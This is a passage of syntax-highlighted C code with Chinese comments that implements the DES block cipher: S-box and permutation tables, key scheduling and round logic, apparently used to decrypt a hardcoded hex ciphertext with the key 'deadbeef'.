        <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S7</span>    
        <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S8</span>    
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">P</span> &#x76D2;&#x7F6E;&#x6362;    
    char p_box<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">25</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x672B;&#x7F6E;&#x6362;    
    char last_ch<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>
        <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>
        <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>
        <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">25</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> hash &#x7F6E;&#x6362;&#xFF0C;&#x5C06;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5BC6;&#x6587;&#x7F6E;&#x6362;&#x4E3A;&#x53EF;&#x8BFB;&#x660E;&#x6587;    
    char hs_ch<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;0123456789abcdef&quot;</span><span class="token punctuation">;</span>
    char sh_ch<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    void init_trans<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        char i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            sh_ch<span class="token punctuation">[</span>hs_ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span> &#x5B8C;&#x6210;hash&#x8F6C;&#x6362;&#x7684;&#x5BF9;&#x5E94;    
    <span class="token punctuation">}</span>

    char msg<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;aed3899df15bd7babb99acf5ebb9f5cd8cd44a77c53263de46ef9f3d773fe908&quot;</span><span class="token punctuation">;</span>
    char res<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    char msgb<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msgbt<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keyb<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    char key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;deadbeef&quot;</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x5B57;&#x7B26;&#x8F6C;&#x6210;&#x4E8C;&#x8FDB;&#x5236;    
    void <span class="token constant">ChToBit</span><span class="token punctuation">(</span>char<span class="token operator">*</span> dest<span class="token punctuation">,</span> char<span class="token operator">*</span> src<span class="token punctuation">,</span> int length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
        char t<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span> t <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                dest<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> t <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span> &#x53D6;&#x5B57;&#x7B26;&#x672B;&#x4F4D;    
                t <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x6210;&#x5B57;&#x7B26;    
    void <span class="token constant">BitToCh</span><span class="token punctuation">(</span>char<span class="token operator">*</span> dest<span class="token punctuation">,</span> char<span class="token operator">*</span> src<span class="token punctuation">,</span> int length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            dest<span class="token punctuation">[</span>i <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            dest<span class="token punctuation">[</span>i <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token operator">=</span> src<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span> &#x6DFB;&#x52A0;&#x5230;&#x672B;&#x4F4D;    
        <span class="token punctuation">}</span>
        dest<span class="token punctuation">[</span>length<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x6279;&#x7F6E;&#x6362;&#xFF0C;&#x4EE5;offset&#x4E3A;&#x504F;&#x79FB;&#xFF0C;&#x4EE5;count&#x4E3A;&#x957F;&#x5EA6;    
    void <span class="token constant">BatchSet</span><span class="token punctuation">(</span>char<span class="token operator">*</span> dest<span class="token punctuation">,</span> char<span class="token operator">*</span> src<span class="token punctuation">,</span> char<span class="token operator">*</span> offset<span class="token punctuation">,</span> int count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>offset<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x5F97;&#x5230;<span class="token number">16</span>&#x8F6E;&#x6240;&#x9700;&#x7684;&#x5BC6;&#x94A5;    
    void getKeys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        char tk<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bk<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        char<span class="token operator">*</span> ptk <span class="token operator">=</span> tk<span class="token punctuation">;</span>
        int i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x8DF3;&#x8FC7;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4F4D;    
        <span class="token constant">ChToBit</span><span class="token punctuation">(</span>bk<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token constant">BatchSet</span><span class="token punctuation">(</span>tk<span class="token punctuation">,</span> bk<span class="token punctuation">,</span> key_ch<span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> key_mov<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">,</span> ptk<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptk<span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">]</span> <span class="token operator">=</span> ptk<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                ptk<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> ptk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token constant">BatchSet</span><span class="token punctuation">(</span>keyb<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ptk<span class="token punctuation">,</span> key_cmprs<span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x5C06;&#x5BC6;&#x6587;&#x8F6C;&#x6362;&#x4E3A;&#x771F;&#x6B63;&#x7684;&#x5BC6;&#x6587;    
    void dropMsg<span class="token punctuation">(</span>char<span class="token operator">*</span> dest<span class="token punctuation">,</span> char<span class="token operator">*</span> src<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            dest<span class="token punctuation">[</span>i <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>dest<span class="token punctuation">[</span>i <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> sh_ch<span class="token punctuation">[</span>src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    void <span class="token constant">DES</span><span class="token punctuation">(</span>char<span class="token operator">*</span> pmsg<span class="token punctuation">,</span> int st<span class="token punctuation">,</span> int cl<span class="token punctuation">,</span> int step<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int i<span class="token punctuation">,</span> row<span class="token punctuation">,</span> col<span class="token punctuation">;</span>
        char r<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rt<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token constant">ChToBit</span><span class="token punctuation">(</span>msgbt<span class="token punctuation">,</span> pmsg<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token constant">BatchSet</span><span class="token punctuation">(</span>msgb<span class="token punctuation">,</span> msgbt<span class="token punctuation">,</span> msg_ch<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x521D;&#x59CB;&#x7F6E;&#x6362;    
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> st <span class="token operator">!=</span> cl<span class="token punctuation">;</span> st <span class="token operator">+</span><span class="token operator">=</span> step<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            memcpy<span class="token punctuation">(</span>rt<span class="token punctuation">,</span> msgb <span class="token operator">+</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token constant">BatchSet</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> msgb <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">,</span> msg_ex<span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x6269;&#x5C55;&#x7F6E;&#x6362;    
            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">48</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
                r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> keyb<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x5F02;&#x6216;&#x64CD;&#x4F5C;    
                                     <span class="token operator">/</span><span class="token operator">/</span> s_box &#x4EE3;&#x66FF;    
            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                row <span class="token operator">=</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                row <span class="token operator">=</span> r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                col <span class="token operator">=</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> r<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                s<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> s_box<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token constant">ChToBit</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token constant">BatchSet</span><span class="token punctuation">(</span>msgb <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> p_box<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> p_box &#x7F6E;&#x6362;    
